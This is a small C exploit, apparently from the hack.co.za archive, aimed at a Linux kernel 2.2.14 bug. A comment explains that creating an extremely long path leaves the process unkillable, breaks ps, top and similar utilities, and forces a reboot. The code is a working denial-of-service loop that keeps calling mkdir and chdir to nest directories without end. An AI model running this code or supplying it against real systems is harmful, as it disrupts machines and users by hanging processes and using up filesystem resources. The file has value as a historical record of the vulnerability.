/*             Linux kernel 2.2.14

Problem description:
 When accessing a file or directory with a very
 long  path the process  hangs in an unkillable
 state.  All  other  processes  are SEGFAULTing
 when  trying  to  access  unkillable  process'
 /proc entry.  So  system utilities ps, w, top,
 killall  and  the  like are stoppping working.
 Except that, the  system continues to function
 normally. The only solution is reboot.

*/

#include <stdio.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>

int main(void)
{
  while(1) {
    if(mkdir("aaaa",0777)<0) {
	perror("mkdir");
	exit(1);
    }
    if(chdir("aaaa")<0) {
	perror("chdir");
	exit(1);
    }
  }
  return(0);
}
/*                    www.hack.co.za                    */